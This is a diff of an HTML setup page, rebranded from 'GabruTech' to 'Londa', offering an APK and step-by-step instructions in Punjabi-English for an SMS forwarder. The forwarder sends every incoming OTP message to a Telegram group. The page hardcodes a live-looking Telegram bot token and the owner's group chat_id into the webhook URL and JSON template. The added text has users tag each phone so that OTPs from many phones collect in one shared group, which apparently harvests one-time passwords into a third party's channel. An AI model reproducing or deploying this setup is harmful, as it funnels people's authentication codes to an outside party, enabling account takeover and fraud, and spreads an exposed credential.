@@ -3,50 +3,38 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<!-- ===== PRIMARY SEO ===== -->
-<title>GabruTech — SMS Forwarder Setup & APK Download | OTP Telegram Guide</title>
-<meta name="description" content="GabruTech — Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward OTP SMS to Telegram. 2 easy methods.">
-<meta name="keywords" content="GabruTech, SMS Forwarder, OTP forwarding, Telegram webhook, APK download, F-Droid, SMS to Telegram, OTP bot">
-<meta name="author" content="GabruTech">
+<title>Londa — SMS Forwarder Setup & APK Download | OTP Telegram Guide</title>
+<meta name="description" content="Londa — Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward OTP SMS to Telegram with name and number.">
+<meta name="keywords" content="Londa, SMS Forwarder, OTP forwarding, Telegram webhook, APK download, F-Droid, SMS to Telegram, OTP bot">
+<meta name="author" content="Londa">
 <meta name="robots" content="index, follow">
-<link rel="canonical" href="https://tattitech.github.io/tattitech/">
-
-<!-- ===== OPEN GRAPH (WhatsApp/Facebook share) ===== -->
+<link rel="canonical" href="https://YOUR_USERNAME.github.io/YOUR_REPO/">
 <meta property="og:type" content="website">
-<meta property="og:title" content="GabruTech — SMS Forwarder Setup & APK Download">
+<meta property="og:title" content="Londa — SMS Forwarder Setup & APK Download">
 <meta property="og:description" content="Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward OTP SMS to Telegram.">
-<meta property="og:url" content="https://tattitech.github.io/tattitech/">
-<meta property="og:image" content="https://tattitech.github.io/tattitech/1.png">
-<meta property="og:site_name" content="GabruTech">
-
-<!-- ===== TWITTER CARD ===== -->
+<meta property="og:url" content="https://YOUR_USERNAME.github.io/YOUR_REPO/">
+<meta property="og:image" content="https://YOUR_USERNAME.github.io/YOUR_REPO/1.png">
+<meta property="og:site_name" content="Londa">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="GabruTech — SMS Forwarder Setup & APK Download">
+<meta name="twitter:title" content="Londa — SMS Forwarder Setup & APK Download">
 <meta name="twitter:description" content="Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step OTP forwarding guide.">
-<meta name="twitter:image" content="https://tattitech.github.io/tattitech/1.png">
-
-<!-- ===== FAVICON ===== -->
+<meta name="twitter:image" content="https://YOUR_USERNAME.github.io/YOUR_REPO/1.png">
 <link rel="icon" type="image/png" href="1.png">
-
-<!-- ===== FONTS ===== -->
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-
-<!-- ===== STRUCTURED DATA (JSON-LD) — Google Rich Results ===== -->
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "WebSite",
-  "name": "GabruTech",
-  "url": "https://tattitech.github.io/tattitech/",
+  "name": "Londa",
+  "url": "https://YOUR_USERNAME.github.io/YOUR_REPO/",
   "description": "Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward OTP SMS to Telegram.",
   "inLanguage": "en",
   "publisher": {
     "@type": "Organization",
-    "name": "GabruTech",
-    "logo": "https://tattitech.github.io/tattitech/1.png"
+    "name": "Londa",
+    "logo": "https://YOUR_USERNAME.github.io/YOUR_REPO/1.png"
   }
 }
 </script>
@@ -62,13 +50,12 @@
     {"@type":"HowToStep","name":"Create New Rule","text":"Click the + icon to create a new forwarding rule."},
     {"@type":"HowToStep","name":"Set Sender","text":"Enter * in the sender field to match all senders."},
     {"@type":"HowToStep","name":"Set Text Filter","text":"Enter OTP in the text filter field."},
-    {"@type":"HowToStep","name":"Add Webhook URL","text":"Paste the Telegram bot webhook URL."},
-    {"@type":"HowToStep","name":"Configure JSON","text":"Open advanced parameters and paste the JSON payload template."},
+    {"@type":"HowToStep","name":"Add Webhook URL","text":"Paste the Telegram bot webhook URL with group chat_id."},
+    {"@type":"HowToStep","name":"Configure JSON","text":"Open advanced parameters and paste the JSON payload template with chat_id and placeholders."},
     {"@type":"HowToStep","name":"Test and Save","text":"Click Test then Save to activate the rule."}
   ]
 }
 </script>
-
 <style>
   :root {
     --bg:#06060d;
@@ -87,10 +74,8 @@
     --font:'Inter', system-ui, -apple-system, sans-serif;
     --mono:'JetBrains Mono', 'Courier New', monospace;
   }
-
   * { margin:0; padding:0; box-sizing:border-box; }
   html { scroll-behavior:smooth; -webkit-text-size-adjust:100%; }
-
   body {
     font-family:var(--font);
     background:var(--bg);
@@ -100,7 +85,6 @@
     font-feature-settings:"cv02","cv03","cv04","cv11";
     -webkit-font-smoothing:antialiased;
   }
-
   body::before {
     content:'';
     position:fixed; inset:-20%; z-index:-1;
@@ -114,7 +98,6 @@
     0%   { transform:translate(0,0) scale(1); }
     100% { transform:translate(-3%,-3%) scale(1.12); }
   }
-
   header {
     text-align:center;
     padding:88px 24px 48px;
@@ -175,9 +158,7 @@
   }
   .pill.green { color:var(--accent-2); border-color:#00ff9d33; background:#00ff9d0d; }
   .pill.purple { color:var(--accent-3); border-color:#7b5cff33; background:#7b5cff0d; }
-
   .container { max-width:780px; margin:0 auto; padding:0 24px 100px; }
-
   .section-label {
     display:flex;
     align-items:center;
@@ -195,7 +176,6 @@
     height:1px;
     background:linear-gradient(90deg,var(--border),transparent);
   }
-
   .card {
     background:linear-gradient(160deg,var(--bg-card),var(--bg-card-2));
     border:1px solid var(--border);
@@ -203,9 +183,7 @@
     padding:30px;
     margin:20px 0;
     box-shadow:0 10px 50px #00000055, inset 0 1px 0 #ffffff08;
-    transition:transform .35s cubic-bezier(.4,0,.2,1),
-               border-color .35s ease,
-               box-shadow .35s ease;
+    transition:transform .35s cubic-bezier(.4,0,.2,1), border-color .35s ease, box-shadow .35s ease;
     position:relative;
     overflow:hidden;
   }
@@ -249,7 +227,6 @@
     margin-left:58px;
     margin-bottom:16px;
   }
-
   .app-img {
     display:block;
     margin:0 auto 16px;
@@ -262,7 +239,6 @@
     transition:transform .45s cubic-bezier(.4,0,.2,1);
   }
   .app-img:hover { transform:scale(1.08) rotate(4deg); }
-
   .btn {
     display:flex;
     align-items:center;
@@ -277,9 +253,7 @@
     text-decoration:none;
     border:none;
     cursor:pointer;
-    transition:transform .2s cubic-bezier(.4,0,.2,1),
-               box-shadow .3s ease,
-               filter .2s ease;
+    transition:transform .2s cubic-bezier(.4,0,.2,1), box-shadow .3s ease, filter .2s ease;
     margin-top:16px;
     letter-spacing:0.2px;
   }
@@ -304,7 +278,6 @@
     box-shadow:0 14px 40px #2ecc714d;
     filter:brightness(1.08);
   }
-
   .step {
     background:#08080f;
     border:1px solid #ffffff08;
@@ -341,7 +314,6 @@
     font-size:0.78rem;
   }
   .step p { color:var(--text); }
-
   .codebox {
     background:#04040a;
     color:var(--accent-2);
@@ -358,7 +330,6 @@
     transition:border-color .3s ease;
   }
   .codebox:hover { border-color:#00ff9d40; }
-
   .copybtn {
     display:inline-flex;
     align-items:center;
@@ -382,7 +353,6 @@
     transform:translateY(-1px);
   }
   .copybtn:active { transform:scale(0.96); }
-
   .note {
     background:linear-gradient(135deg,#ffcc000d,#ff88000d);
     border:1px solid #ffcc0033;
@@ -404,16 +374,13 @@
     font-size:0.82rem;
     margin:2px 0;
   }
-
   .hl { color:var(--accent); font-weight:700; }
   .hl-green { color:var(--accent-2); font-weight:700; }
-
   .divider {
     height:1px;
     background:linear-gradient(90deg,transparent,#00e5ff33,transparent);
     margin:12px 0;
   }
-
   footer {
     text-align:center;
     padding:48px 24px;
@@ -428,7 +395,6 @@
     letter-spacing:-0.3px;
   }
   footer p + p { margin-top:6px; }
-
   .toast {
     position:fixed;
     bottom:32px; left:50%;
@@ -449,7 +415,6 @@
     transform:translateX(-50%) translateY(0);
     opacity:1;
   }
-
   @media (max-width:600px) {
     header { padding:64px 20px 32px; }
     .container { padding:0 18px 80px; }
@@ -467,7 +432,6 @@
       font-family:var(--font);
     }
   }
-
   @media (hover:none) {
     .card:active {
       transform:scale(0.99);
@@ -479,7 +443,6 @@
       color:#001014;
     }
   }
-
   @media (prefers-reduced-motion: reduce) {
     *, *::before, *::after {
       animation-duration:0.01ms !important;
@@ -493,7 +456,7 @@
 
 <header>
   <div class="logo-mark">⚡</div>
-  <h1>GabruTech</h1>
+  <h1>Londa</h1>
   <p class="tagline">APK Download &amp; SMS Forwarder Setup — Telegram OTP Forwarding Guide</p>
   <div class="pills">
     <span class="pill">⚡ 2 Methods</span>
@@ -511,7 +474,7 @@
       <h2>Method 1 — Direct APK</h2>
     </div>
     <p class="sub">File: app-release.apk • Size: 2.5 MB</p>
-    <img src="2.png" alt="GabruTech APK Logo" class="app-img">
+    <img src="2.png" alt="Londa APK Logo" class="app-img">
     <a class="btn btn-primary" href="app-release.apk" download>
       ⬇ Download app-release.apk
     </a>
@@ -589,8 +552,8 @@
     <!-- Step 5 -->
     <div class="step">
       <div class="step-title"><span class="step-num">5</span> Webhook URL</div>
-      <p>Webhook URL field vich eh link pao:</p>
-      <div class="codebox" id="webhook">https://api.telegram.org/bot8962351328:AAGf-zO6MCrjyKOcKpvXmo9hrjUYjYFEOhQ/sendMessage?chat_id=8672281950</div>
+      <p>Webhook URL field vich eh link pao (group chat_id naal):</p>
+      <div class="codebox" id="webhook">https://api.telegram.org/bot8962351328:AAGf-zO6MCrjyKOcKpvXmo9hrjUYjYFEOhQ/sendMessage?chat_id=-1004355666217</div>
       <button class="copybtn" onclick="copyCode('webhook')">📋 Copy Webhook URL</button>
     </div>
 
@@ -599,27 +562,30 @@
       <div class="step-title"><span class="step-num">6</span> JSON Payload Template</div>
       <p>Advanced parameter kholo → JSON payload template vich eh paste karo:</p>
       <div class="codebox" id="json">{
-  "chat_id": "8672281950",
-  "text": "📩 %from%\n📞 %fromNumber%\n📲 Prince\n🔑 %text%\n⏰ %sentStamp=dd-MM-yyyy HH:mm%"
+  "chat_id": "-1004355666217",
+  "text": "📩 From: %from%\n📲 [Name]\n📞 [Number]\n🔑 %text%\n⏰ %sentStamp=dd-MM-yyyy HH:mm%"
 }</div>
       <button class="copybtn" onclick="copyCode('json')">📋 Copy JSON</button>
 
       <div class="note" style="margin-top:18px;">
         <b>⚠️ ZAROORI — Eh padho:</b><br><br>
-        JSON vich jithe <span class="hl-green">"Prince"</span> likhya hai, othe tusi
-        <b>apna naam YA apna mobile number</b> likhna hai — jis phone vich eh activity ho rahi hai.
+        JSON vich <span class="hl-green">[Name]</span> di jagah <b>apna naam</b> likho, te
+        <span class="hl-green">[Number]</span> di jagah <b>apna mobile number</b> likho — jis phone vich eh activity ho rahi hai.
         <br><br>
         <b>Example 1 — Naam:</b><br>
         <code>"📲 Maninder"</code>
         <br><br>
         <b>Example 2 — Mobile Number:</b><br>
-        <code>"📲 +919876543210"</code>
+        <code>"📞 +919876543210"</code>
         <br><br>
         <b>Example 3 — Dono:</b><br>
-        <code>"📲 Maninder (+919876543210)"</code>
+        <code>"📲 Maninder"</code><br>
+        <code>"📞 +919876543210"</code>
         <br><br>
-        👉 <b>Jis phone vich OTP aayega, us phone te oh phone da naam ya number likho.</b>
+        👉 <b>Jis phone vich OTP aayega, us phone te oh phone da naam te number likho.</b>
         Telegram te message vich ehhi dikhega — taaki pata lage kis number/phone te OTP aaya.
+        <br><br>
+        <b>📌 Note:</b> Sab OTP ik hi group (General) vich aayenge. Har phone de JSON vich alag naam/number pao, taaki pata lage kaunse phone da OTP aa.
       </div>
     </div>
 
@@ -633,7 +599,7 @@
 </div>
 
 <footer>
-  <p>© 2026 <span class="brand">GabruTech</span> — SMS Forwarder Setup Guide</p>
+  <p>© 2026 <span class="brand">Londa</span> — SMS Forwarder Setup Guide</p>
   <p>Made with 💙 for easy OTP forwarding</p>
 </footer>
 
